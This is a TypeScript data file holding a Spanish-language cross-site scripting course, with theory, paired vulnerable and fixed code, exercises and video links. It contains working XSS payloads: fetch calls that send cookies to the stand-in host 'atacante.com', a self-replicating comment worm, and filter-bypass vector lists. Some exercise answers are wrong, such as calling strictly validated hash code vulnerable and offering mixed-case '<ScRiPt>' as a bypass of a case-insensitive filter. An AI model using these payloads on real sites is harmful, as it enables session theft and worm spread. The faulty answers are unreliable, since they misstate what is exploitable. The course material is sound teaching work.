import type { TheorySection } from '../types';

export const theorySections: TheorySection[] = [
  {
    id: 'intro',
    title: '1. Introducción a XSS',
    order: 1,
    content: 'Cross-Site Scripting (XSS) es una de las vulnerabilidades web más comunes y peligrosas. Entender XSS es fundamental para cualquier desarrollador o profesional de seguridad.',
    subsections: [
      {
        title: '¿Qué es Cross-Site Scripting?',
        content: `**Definición**

XSS es una vulnerabilidad de seguridad que permite a un atacante inyectar código JavaScript malicioso en páginas web que serán vistas por otros usuarios.

**¿Por qué es tan peligroso?**

A diferencia de otras vulnerabilidades que atacan directamente al servidor, XSS explota la confianza que un usuario tiene en un sitio web. Cuando un usuario visita un sitio en el que confía (como su banco, red social, o correo electrónico), el navegador ejecuta todo el JavaScript de ese sitio sin restricciones.

Si un atacante logra inyectar su propio JavaScript en ese sitio de confianza, su código se ejecutará con los mismos privilegios y permisos que el código legítimo del sitio.

**Impactos Reales Documentados:**

- **British Airways (2018)**: Un ataque XSS comprometió 380,000 transacciones de tarjetas de crédito
- **MySpace Samy Worm (2005)**: Un solo payload XSS infectó más de 1 millón de perfiles en menos de 20 horas
- **TweetDeck (2014)**: Un tweet con XSS se auto-retuiteaba automáticamente, afectando a miles de usuarios

**¿Qué puede hacer un atacante con XSS?**

1. Robo de Sesiones: Capturar cookies y tokens de autenticación
2. Phishing Avanzado: Modificar la página para mostrar formularios falsos
3. Keylogging: Registrar todas las pulsaciones de teclado
4. Defacement: Cambiar completamente el contenido del sitio
5. Propagación de Malware: Redirigir a sitios maliciosos
6. Acciones No Autorizadas: Realizar transferencias, cambiar contraseñas, etc.`,
        videoUrl: 'https://www.youtube.com/watch?v=EoaDgUgS6QA&t=341s',
        videoTitle: 'Cross Site Scripting (XSS) Explained',
        codeExamples: [
          {
            title: 'Código Vulnerable',
            explanation: 'Este código toma input del usuario directamente de la URL y lo inserta en el HTML sin validación',
            code: `// Página de búsqueda vulnerable
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML =
  '<h2>Resultados para: ' + searchQuery + '</h2>';

// URL maliciosa:
// ?q=<img src=x onerror="fetch('https://atacante.com/robar?c='+document.cookie)">`
          },
          {
            title: 'Código Seguro',
            explanation: 'Usar textContent o createElement previene la ejecución de código malicioso',
            code: `// Opción 1: Usar textContent
const searchQuery = new URLSearchParams(window.location.search).get('q');
const h2 = document.createElement('h2');
h2.textContent = 'Resultados para: ' + searchQuery;
document.getElementById('results').appendChild(h2);

// Opción 2: Escapar HTML
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

document.getElementById('results').innerHTML =
  '<h2>Resultados para: ' + escapeHtml(searchQuery) + '</h2>';`
          }
        ]
      },
      {
        title: 'Trust Boundaries (Fronteras de Confianza)',
        content: `**¿Qué es un Trust Boundary?**

Un Trust Boundary es la línea que separa datos confiables de datos no confiables en tu aplicación.

**Lado NO Confiable (Untrusted):**

- Parámetros de URL
- Campos de formularios
- Cookies (pueden ser manipuladas)
- Headers HTTP
- localStorage/sessionStorage
- Mensajes de postMessage

**Lado Confiable (Trusted):**

- Código de tu aplicación
- Tu base de datos (aunque puede contener datos no confiables)
- Tus servidores
- APIs internas

**El Problema de XSS**

XSS ocurre cuando datos del lado no confiable cruzan hacia el lado confiable SIN validación, sanitización, o encoding apropiado.

**Same-Origin Policy (SOP)**

SOP es una defensa fundamental del navegador que previene que código de un origen acceda a datos de otro origen. Pero XSS bypasea esta protección porque el código malicioso se ejecuta en el mismo origen que el sitio legítimo.`,
        videoUrl: 'https://www.youtube.com/watch?v=wkqzZZBe6jE',
        videoTitle: 'Understanding Web Security: Trust Boundaries',
        codeExamples: [
          {
            title: 'Trust Boundary Violation',
            code: `// INPUT - No Confiable
const userComment = document.getElementById('comment-input').value;

// TRUST BOUNDARY - Aquí deberías validar

// OUTPUT - Confiable (VULNERABLE)
document.getElementById('comments').innerHTML +=
  '<div class="comment">' + userComment + '</div>';
// Datos no confiables entraron sin validación`
          },
          {
            title: 'Defensa Correcta',
            code: `// INPUT - No Confiable
const userComment = document.getElementById('comment-input').value;

// TRUST BOUNDARY - Validación
function sanitizeInput(untrusted) {
  return untrusted
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// OUTPUT - Confiable (SEGURO)
const safeComment = sanitizeInput(userComment);
document.getElementById('comments').innerHTML +=
  '<div class="comment">' + safeComment + '</div>';`
          }
        ],
        exercises: [
          {
            question: '¿Por qué el navegador no puede distinguir entre JavaScript legítimo y JavaScript inyectado?',
            answer: 'Porque ambos se ejecutan en el mismo origen (protocolo + dominio + puerto) y el navegador les da los mismos permisos. Same-Origin Policy protege entre orígenes diferentes, pero no puede proteger contra código malicioso del mismo origen.'
          }
        ]
      }
    ]
  },
  {
    id: 'types',
    title: '2. Tipos de XSS',
    order: 2,
    content: 'Existen tres tipos principales de XSS. Cada tipo requiere diferentes técnicas de ataque y defensa.',
    subsections: [
      {
        title: 'Reflected XSS (No Persistente)',
        content: `**Definición**

El payload malicioso es parte de la request HTTP y se refleja inmediatamente de vuelta en la response.

**Características:**

- NO se almacena en el servidor
- Requiere que la víctima haga clic en un link malicioso
- Afecta solo a quien hace clic
- Es el tipo MÁS COMÚN de XSS

**Flujo del Ataque:**

1. Descubrimiento: El atacante encuentra un parámetro vulnerable
2. Crafting: Construye un payload malicioso
3. Distribución: Envía el link malicioso vía email, redes sociales, etc.
4. Ejecución: La víctima hace clic y el payload se ejecuta

**Métodos de Distribución:**

- Phishing Email
- Redes Sociales con links acortados
- Comentarios en Foros
- Publicidad Maliciosa
- Códigos QR`,
        videoUrl: 'https://www.youtube.com/watch?v=T0vxdqvW9fU',
        videoTitle: 'Reflected XSS Attacks Explained',
        codeExamples: [
          {
            title: 'Backend Vulnerable (Node.js)',
            code: `app.get('/search', (req, res) => {
  const searchQuery = req.query.q;

  // VULNERABLE: Inserción directa en HTML
  res.send(\`
    <!DOCTYPE html>
    <html>
      <head><title>Resultados</title></head>
      <body>
        <h1>Resultados para: \${searchQuery}</h1>
        <div id="results"></div>
      </body>
    </html>
  \`);
});`
          },
          {
            title: 'Construcción del Ataque',
            code: `// URL Normal
https://ejemplo.com/search?q=zapatos

// URL Maliciosa
https://ejemplo.com/search?q=<script>
  fetch('https://atacante.com/robar', {
    method: 'POST',
    body: document.cookie
  })
</script>

// URL Codificada (menos sospechosa)
https://ejemplo.com/search?q=%3Cscript%3E...%3C%2Fscript%3E`
          },
          {
            title: 'Defensa Correcta',
            code: `app.get('/search', (req, res) => {
  const searchQuery = req.query.q;

  // Escapar caracteres especiales
  const safeQuery = escapeHtml(searchQuery);

  res.send(\`
    <!DOCTYPE html>
    <html>
      <head><title>Resultados</title></head>
      <body>
        <h1>Resultados para: \${safeQuery}</h1>
        <div id="results"></div>
      </body>
    </html>
  \`);
});

function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}`
          }
        ],
        exercises: [
          {
            question: '¿Este código es vulnerable? app.get(\'/welcome\', (req, res) => { res.send(\'<h1>Hola \' + req.query.name + \'!</h1>\'); });',
            answer: 'SÍ, es vulnerable a Reflected XSS. Payload: ?name=<img src=x onerror=alert(1)>'
          }
        ]
      },
      {
        title: 'Stored XSS (Persistente)',
        content: `**Definición**

El payload se ALMACENA permanentemente en el servidor (base de datos, archivos, logs) y se ejecuta cada vez que alguien ve ese contenido.

**¿Por qué es MÁS peligroso que Reflected?**

1. Sin Ingeniería Social: NO requiere que la víctima haga clic en un link especial
2. Impacto Masivo: Afecta a TODOS los usuarios que vean el contenido
3. Persistencia: El ataque continúa indefinidamente hasta ser detectado
4. Auto-Propagación: Puede crear worms que se replican solos
5. Mayor Credibilidad: El payload está en el sitio oficial

**Casos Reales:**

- **MySpace Samy Worm (2005)**: 1 millón de infectados en 20 horas
- **TweetDeck (2014)**: Auto-retuiteo masivo en minutos
- **eBay (2016)**: XSS en descripciones de productos afectó a millones

**Vectores Comunes:**

- Comentarios en blogs, foros, reviews
- Perfiles de Usuario (nombre, biografía, ubicación)
- Mensajes Privados
- Nombres de Archivos subidos
- Logs de Sistema`,
        videoUrl: 'https://www.youtube.com/watch?v=6yZV2IQB2OE',
        videoTitle: 'Stored XSS - The Most Dangerous Type',
        codeExamples: [
          {
            title: 'Sistema de Comentarios Vulnerable',
            code: `// Backend: Guardar comentario (VULNERABLE)
app.post('/api/comments', async (req, res) => {
  const { author, content } = req.body;

  // Guarda sin sanitizar
  await db.query(
    'INSERT INTO comments (author, content) VALUES ($1, $2)',
    [author, content]
  );

  res.json({ success: true });
});

// Frontend: Mostrar comentarios (VULNERABLE)
async function loadComments() {
  const response = await fetch('/api/comments');
  const comments = await response.json();

  const container = document.getElementById('comments');
  comments.forEach(comment => {
    container.innerHTML += \`
      <div class="comment">
        <strong>\${comment.author}</strong>
        <p>\${comment.content}</p>
      </div>
    \`;
  });
}`
          },
          {
            title: 'Payload de Worm Auto-Replicante',
            code: `const maliciousComment = \`
<img src=x onerror="
  // Paso 1: Robar datos
  fetch('https://atacante.com/log', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: location.href
    })
  });

  // Paso 2: Auto-replicarse (WORM)
  const payload = this.getAttribute('onerror');
  fetch('/api/comments', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      author: '[Bot]',
      content: '<img src=x onerror=\\"' + payload + '\\">'
    })
  });
">
\`;

// Propagación exponencial:
// Usuario 1 ve el comentario → infectado → crea 1 comentario más
// Usuario 2 ve 2 comentarios → infectado → crea 1 comentario más (total: 3)
// Usuario 3 ve 3 comentarios → infectado → crea 1 comentario más (total: 4)`
          },
          {
            title: 'Defensa Correcta con DOMPurify',
            code: `import DOMPurify from 'isomorphic-dompurify';

// Backend: Sanitizar al guardar
app.post('/api/comments', async (req, res) => {
  const { author, content } = req.body;

  // Sanitizar contenido
  const cleanContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });

  await db.query(
    'INSERT INTO comments (author, content) VALUES ($1, $2)',
    [author, cleanContent]
  );

  res.json({ success: true });
});

// Frontend: Usar textContent
async function loadComments() {
  const response = await fetch('/api/comments');
  const comments = await response.json();

  const container = document.getElementById('comments');
  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';

    const authorEl = document.createElement('strong');
    authorEl.textContent = comment.author;

    const contentEl = document.createElement('p');
    contentEl.textContent = comment.content;

    div.appendChild(authorEl);
    div.appendChild(contentEl);
    container.appendChild(div);
  });
}`
          }
        ]
      },
      {
        title: 'DOM-based XSS',
        content: `**Definición**

La vulnerabilidad existe completamente en el código JavaScript del lado del cliente. El payload NUNCA toca el servidor.

**¿Por qué es diferente?**

En Reflected/Stored XSS el servidor procesa el payload. En DOM-based XSS:

- El servidor puede servir código 100% seguro
- La vulnerabilidad está en CÓMO el JavaScript del cliente procesa datos
- NO aparece en logs del servidor
- Difícil de detectar con WAFs

**Sources (Fuentes No Confiables):**

- location.href, location.search, location.hash
- document.referrer
- document.cookie
- localStorage/sessionStorage
- window.name
- postMessage

**Sinks (Puntos Peligrosos):**

- innerHTML/outerHTML
- document.write()
- eval()
- setTimeout/setInterval (con strings)
- element.setAttribute()
- location.href
- script.src/iframe.src

**Regla de Oro:**

DOM XSS = Source (no confiable) → Sink (peligroso) SIN sanitización`,
        videoUrl: 'https://www.youtube.com/watch?v=_3Wgx1FabIo',
        videoTitle: 'DOM-based XSS Explained',
        codeExamples: [
          {
            title: 'Hash Fragment Vulnerability',
            code: `// JavaScript del cliente
window.addEventListener('load', () => {
  // SOURCE: location.hash (controlado por atacante)
  const username = decodeURIComponent(location.hash.substring(1));

  // SINK: innerHTML (peligroso)
  document.getElementById('welcome').innerHTML =
    'Bienvenido, ' + username + '!';
});

// ATAQUE:
// https://sitio.com/dashboard#<img src=x onerror=alert(document.cookie)>
// El fragmento # NO se envía al servidor
// El servidor sirve JavaScript legítimo
// El JavaScript del cliente lee location.hash e inyecta el payload`
          },
          {
            title: 'PostMessage Vulnerability',
            code: `// Página receptora (vulnerable)
window.addEventListener('message', (event) => {
  // No valida el origin
  // Usa innerHTML directamente
  document.getElementById('content').innerHTML = event.data;
});

// Página atacante
const victimWindow = window.open('https://sitio-vulnerable.com');

setTimeout(() => {
  victimWindow.postMessage(
    '<img src=x onerror=alert(document.cookie)>',
    '*'  // Permite cualquier origen
  );
}, 1000);`
          },
          {
            title: 'Defensa Correcta',
            code: `// Usar textContent (seguro)
window.addEventListener('load', () => {
  const username = decodeURIComponent(location.hash.substring(1));

  // textContent no parsea HTML
  document.getElementById('welcome').textContent =
    'Bienvenido, ' + username + '!';
});

// Validar PostMessage
window.addEventListener('message', (event) => {
  // Validar origen
  if (event.origin !== 'https://trusted-domain.com') {
    return;
  }

  // Usar textContent
  document.getElementById('content').textContent = event.data;
});`
          }
        ],
        exercises: [
          {
            question: '¿Este código es vulnerable? const page = location.hash.substring(1); if (page === \'home\' || page === \'about\') { document.getElementById(\'content\').innerHTML = \'<h1>\' + page + \'</h1>\'; }',
            answer: 'SÍ, vulnerable a DOM XSS. Payload: #home<img src=x onerror=alert(1)>. Aunque valida el valor antes de usarlo, no escapa el HTML al insertarlo.'
          }
        ]
      }
    ]
  },
  {
    id: 'contexts',
    title: '3. Contextos de Inyección',
    order: 3,
    content: 'El contexto donde se inyecta el payload determina qué técnicas funcionarán. Entender los contextos es fundamental.',
    subsections: [
      {
        title: 'HTML Context',
        content: `**Definición**

Tu entrada se inserta directamente en el contenido HTML de un elemento.

**Vectores de Ataque**

Hay muchas maneras de ejecutar JavaScript en contexto HTML, no solo script tags:

- Script tags directos
- Event handlers (onerror, onload, onfocus, etc.)
- JavaScript protocol (javascript:)
- SVG con script
- Iframes con src malicioso

**Bypass de Filtros**

- Case variation: ScRiPt
- Espacios, tabs, newlines
- Sin espacios: img/src=x/onerror=alert(1)
- Encoding: &#97; para 'a'
- Comentarios HTML`,
        videoUrl: 'https://www.youtube.com/watch?v=fothyVH9FwM',
        videoTitle: 'HTML Context XSS - Attack Vectors',
        codeExamples: [
          {
            title: 'Vectores Básicos',
            code: `<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>`
          },
          {
            title: 'Bypass de Filtros',
            code: `// Mayúsculas/minúsculas
<ScRiPt>alert(1)</sCrIpT>

// Sin espacios
<img/src=x/onerror=alert(1)>

// Encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// Comentarios
<scr<!---->ipt>alert(1)</scr<!---->ipt>`
          },
          {
            title: 'Defensa',
            code: `function escapeHtml(unsafe) {
  const div = document.createElement('div');
  div.textContent = unsafe;
  return div.innerHTML;
}

const safe = escapeHtml(userInput);
element.innerHTML = '<h2>Resultados: ' + safe + '</h2>';`
          }
        ]
      },
      {
        title: 'Attribute Context',
        content: `**Definición**

Tu entrada está dentro del VALOR de un atributo HTML.

**El Desafío**

Ya estás DENTRO de un tag, no puedes simplemente usar < o >.

**Estrategias:**

1. Cerrar el atributo actual (usando " o ')
2. Agregar un nuevo atributo (event handler)
3. Cerrar el tag completo (usando >)
4. Usar protocolos especiales (javascript:, data:)

**Casos Especiales**

- Atributos sin comillas: más fácil de explotar
- Atributos href: usar javascript:
- Event handlers: escape de funciones`,
        videoUrl: 'https://www.youtube.com/watch?v=NIUsJZhGvFs',
        videoTitle: 'XSS in HTML Attributes',
        codeExamples: [
          {
            title: 'Value Attribute',
            code: `<input type="text" value="USER_INPUT">

// Payload: Cerrar atributo + event handler
" onfocus="alert(1)" autofocus="

// Resultado:
<input type="text" value="" onfocus="alert(1)" autofocus="">`
          },
          {
            title: 'Href Attribute',
            code: `<a href="USER_INPUT">Click</a>

// Payload: javascript protocol
javascript:alert(document.cookie)

// Resultado:
<a href="javascript:alert(document.cookie)">Click</a>`
          },
          {
            title: 'Event Handler Context',
            code: `<div onclick="doSomething('USER_INPUT')">

// Payload: Escape de función
'); alert(1); //

// Resultado:
<div onclick="doSomething(''); alert(1); //')">

// '); cierra la string y función
// alert(1); tu código
// // comenta el resto`
          },
          {
            title: 'Defensa',
            code: `function escapeAttr(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// O mejor, usar APIs del DOM
element.value = userInput;  // No puede causar XSS
element.setAttribute('value', userInput);  // Escape automático`
          }
        ]
      },
      {
        title: 'JavaScript Context',
        content: `**Definición**

Tu entrada está DENTRO de código JavaScript (script tags, event handlers, archivos .js).

**El Peligro Máximo**

Ya estás en contexto de ejecución. NO necesitas script tags ni event handlers. Solo necesitas escapar del contexto actual y ejecutar tu código.

**Lugares Comunes:**

- Inline script tags
- Event handlers
- javascript: URLs
- eval() o Function()
- Template literals
- JSON injection

**Objetivo**

Romper el contexto actual (string, función, objeto) y ejecutar tu código.`,
        videoUrl: 'https://www.youtube.com/watch?v=eIHGNgibcjA',
        videoTitle: 'JavaScript Context XSS',
        codeExamples: [
          {
            title: 'String Literal',
            code: `<script>
  var username = 'USER_INPUT';
  alert('Hola ' + username);
</script>

// Payload:
'; alert(document.cookie); //

// Resultado:
var username = ''; alert(document.cookie); //';`
          },
          {
            title: 'Template Literal',
            code: `<script>
  const msg = \`Bienvenido USER_INPUT\`;
</script>

// Payload:
\${alert(document.cookie)}

// Resultado:
const msg = \`Bienvenido \${alert(document.cookie)}\`;`
          },
          {
            title: 'Object Property Injection',
            code: `<script>
  var config = {
    username: "USER_INPUT",
    theme: "dark"
  };
</script>

// Payload:
", isAdmin: true, forged: "

// Resultado:
var config = {
  username: "", isAdmin: true, forged: "",
  theme: "dark"
};`
          },
          {
            title: 'Bypass Técnicas',
            code: `// Si ' y " están filtrados
\\u0061\\u006c\\u0065\\u0072\\u0074(1)  // Unicode escape
String.fromCharCode(97,108,101,114,116,40,49,41)

// Si "alert" está filtrado
window['al'+'ert'](1)
eval('al'+'ert(1)')

// Si paréntesis están filtrados
alert\`1\`  // Tagged template`
          },
          {
            title: 'Defensa',
            code: `// NUNCA pongas input de usuario en JavaScript inline
// MAL:
<script>var name = "<?= $username ?>";</script>

// BIEN: Usa data attributes
<div id="app" data-username="<?= htmlspecialchars($username) ?>"></div>
<script>
  const name = document.getElementById('app').dataset.username;
</script>

// MEJOR: API JSON separada
<script>
  fetch('/api/user')
    .then(r => r.json())
    .then(user => console.log(user.name));
</script>`
          }
        ]
      }
    ]
  },
  {
    id: 'defense',
    title: '4. Defensa Contra XSS',
    order: 4,
    content: 'Prevenir XSS requiere un enfoque de defensa en profundidad con múltiples capas de protección.',
    subsections: [
      {
        title: 'Output Encoding',
        content: `**Principio Fundamental**

NUNCA confíes en input de usuario. SIEMPRE encode/escape antes de mostrar.

**Context-Aware Encoding**

El encoding DEBE ser apropiado para el contexto:

- HTML Context → HTML entities
- JavaScript Context → JavaScript escape
- URL Context → URL encoding
- Attribute Context → Attribute escape

Usar el encoding incorrecto = vulnerabilidad.

**Mejores Prácticas:**

1. Encode al OUTPUT, no al input
2. Usa APIs seguras del DOM cuando sea posible
3. Whitelist sobre blacklist`,
        videoUrl: 'https://www.youtube.com/watch?v=ns1LX6mEvyM',
        videoTitle: 'Output Encoding Best Practices',
        codeExamples: [
          {
            title: 'HTML Encoding',
            code: `function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")    // PRIMERO! & es especial
    .replace(/</g, "&lt;")     // < inicia tags
    .replace(/>/g, "&gt;")     // > cierra tags
    .replace(/"/g, "&quot;")   // " cierra atributos
    .replace(/'/g, "&#x27;")   // ' cierra atributos
    .replace(/\\//g, "&#x2F;");  // / puede cerrar tags
}

const safe = escapeHtml('<script>alert(1)</script>');
element.innerHTML = safe;
// Resultado: &lt;script&gt;alert(1)&lt;/script&gt;`
          },
          {
            title: 'JavaScript Encoding',
            code: `// Usar JSON.stringify
function escapeJs(unsafe) {
  return JSON.stringify(unsafe).slice(1, -1);
}

const userInput = '"; alert(1); //';
const safe = escapeJs(userInput);
const code = \`var name = "\${safe}";\`;
// Las comillas están escapadas, NO ejecuta`
          },
          {
            title: 'URL Encoding',
            code: `// Usar encodeURIComponent para parámetros
const userInput = 'hello world&param=<script>';
const safe = encodeURIComponent(userInput);
const url = \`https://site.com/page?q=\${safe}\`;

// Resultado:
// ?q=hello%20world%26param%3D%3Cscript%3E

// IMPORTANTE:
// encodeURI → Para URLs completas
// encodeURIComponent → Para parámetros (encode TODO)`
          },
          {
            title: 'APIs Seguras del DOM',
            code: `// Preferir:
element.textContent = userInput;  // Nunca parsea HTML
element.setAttribute('value', userInput);  // Escape automático
element.value = userInput;  // No puede causar XSS

// Evitar:
element.innerHTML = userInput;  // Parsea HTML = peligro
element.outerHTML = userInput;  // Parsea HTML = peligro`
          }
        ]
      },
      {
        title: 'Content Security Policy (CSP)',
        content: `**¿Qué es CSP?**

Content Security Policy es un HTTP header que le dice al navegador qué recursos son legítimos y pueden ejecutarse.

**¿Cómo ayuda contra XSS?**

- Bloquea inline scripts
- Bloquea inline event handlers
- Bloquea eval()
- Solo permite scripts de dominios específicos
- Reporta violaciones para monitoreo

**Importante**

CSP es defensa SECUNDARIA. NO reemplaza output encoding.

**Niveles:**

1. CSP Básico: Bloquea lo más obvio
2. CSP Estricto: Usa nonces o hashes
3. CSP Report-Only: Testing sin bloquear`,
        videoUrl: 'https://www.youtube.com/watch?v=txHc4zk6w3s',
        videoTitle: 'Content Security Policy Explained',
        codeExamples: [
          {
            title: 'CSP Básico',
            code: `// HTTP Header:
Content-Security-Policy: default-src 'self'; script-src 'self'

// Permitido:
<script src="/js/app.js"></script>

// Bloqueado:
<script>alert(1)</script>  // Inline script
<img src=x onerror="alert(1)">  // Inline event handler
<script src="https://evil.com/bad.js"></script>  // Origen diferente`
          },
          {
            title: 'CSP con Nonce',
            code: `// Backend genera nonce único
const nonce = crypto.randomBytes(16).toString('base64');

// Header:
Content-Security-Policy: script-src 'self' 'nonce-abc123xyz'

// HTML con nonce:
<script nonce="abc123xyz">
  console.log('Código legítimo');
</script>

// Sin nonce se bloquea:
<script>alert(1)</script>  // BLOQUEADO`
          },
          {
            title: 'CSP Completo',
            code: `Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-RANDOM';
  style-src 'self';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';`
          }
        ]
      },
      {
        title: 'DOMPurify',
        content: `**¿Cuándo usar DOMPurify?**

Solo cuando NECESITAS permitir HTML rico (rich text editors, markdown, comentarios con formato).

**¿Qué hace?**

Parsea el HTML y elimina:

- Tags peligrosos (script, iframe, etc.)
- Atributos peligrosos (onclick, onerror, etc.)
- Protocolos peligrosos (javascript:, data:)
- Protege contra Mutation XSS

**Importante**

DOMPurify es más permisivo que output encoding. Úsalo solo cuando realmente necesites HTML.`,
        videoUrl: 'https://www.youtube.com/watch?v=YjFTidoXOOk&t=107s',
        videoTitle: 'DOMPurify Tutorial',
        codeExamples: [
          {
            title: 'Uso Básico',
            code: `import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);

console.log(clean);
// Resultado: '<img src="x">'
// onerror fue removido`
          },
          {
            title: 'Configuración Restrictiva',
            code: `const dirty = \`
  <p>Texto normal</p>
  <script>alert(1)</script>
  <a href="javascript:alert(1)">Link</a>
  <b>Negrita</b>
\`;

const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

// Resultado:
// <p>Texto normal</p>
// <a>Link</a>
// <b>Negrita</b>

// Removió: <script> y javascript:`
          },
          {
            title: 'Rich Text Editor',
            code: `const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: [
    'h1', 'h2', 'h3', 'p', 'br',
    'b', 'strong', 'i', 'em', 'u',
    'ul', 'ol', 'li',
    'a', 'img',
    'blockquote', 'code', 'pre'
  ],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i
});

element.innerHTML = clean;`
          }
        ]
      }
    ]
  },
  {
    id: 'advanced',
    title: '5. Técnicas Avanzadas',
    order: 5,
    content: 'Técnicas sofisticadas usadas por atacantes para bypassear filtros y defensas.',
    subsections: [
      {
        title: 'Filter Bypass',
        content: `**Regla de Oro**

Blacklists NO funcionan. Siempre hay un bypass.

**Categorías de Bypass:**

1. Case Variation: Mayúsculas/minúsculas
2. Encoding: HTML entities, URL encoding, Unicode
3. Caracteres Especiales: Espacios, tabs, newlines
4. Fragmentación: Dividir palabras filtradas
5. Alternativas: Usar tags/eventos diferentes
6. Mutation: Explotar parsing inconsistente

**Por qué Blacklists Fallan:**

- Infinitas variaciones de encoding
- Cientos de tags y eventos diferentes
- Parsing inconsistente entre navegadores
- Nuevas técnicas constantemente descubiertas

**Solución**

Whitelist + Output encoding + CSP`,
        videoUrl: 'https://www.youtube.com/watch?v=3mP-COJCnB4',
        videoTitle: 'XSS Filter Bypass Techniques',
        codeExamples: [
          {
            title: 'Case Variation',
            code: `// Filtro busca '<script>'
if (input.includes('<script>')) {
  return 'Bloqueado';
}

// Bypass:
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</ScRiPt>`
          },
          {
            title: 'Encoding',
            code: `// HTML Entities
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
// &#97; = a, &#108; = l, etc.

// Unicode escapes
<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>

// URL encoding
<a href="javascript:alert%281%29">Click</a>`
          },
          {
            title: 'Tags Alternativos',
            code: `// Si <script> está bloqueado:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>`
          },
          {
            title: 'Fragmentación',
            code: `// Si "alert" está filtrado:
<script>window['al'+'ert'](1)</script>
<script>eval('al'+'ert(1)')</script>
<script>Function('ale'+'rt(1)')()</script>
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>`
          },
          {
            title: 'Enfoque Correcto (Whitelist)',
            code: `// MAL: Blacklist
function sanitize(input) {
  return input
    .replace(/<script>/gi, '')
    .replace(/onerror/gi, '')
    .replace(/alert/gi, '');
}
// Fácilmente bypasseable

// BIEN: Whitelist + Encoding
function sanitize(input) {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// MEJOR: DOMPurify con whitelist
return DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ['b', 'i'],
  ALLOWED_ATTR: []
});`
          }
        ],
        exercises: [
          {
            question: 'Bypassea este filtro: function filter(input) { return input.replace(/<script>/gi, \'\'); }',
            answer: 'Soluciones: 1) <ScRiPt>alert(1)</sCrIpT>, 2) <scrip<script>t>alert(1)</scrip<script>t>, 3) <img src=x onerror=alert(1)>, 4) <svg onload=alert(1)>'
          }
        ]
      }
    ]
  }
];
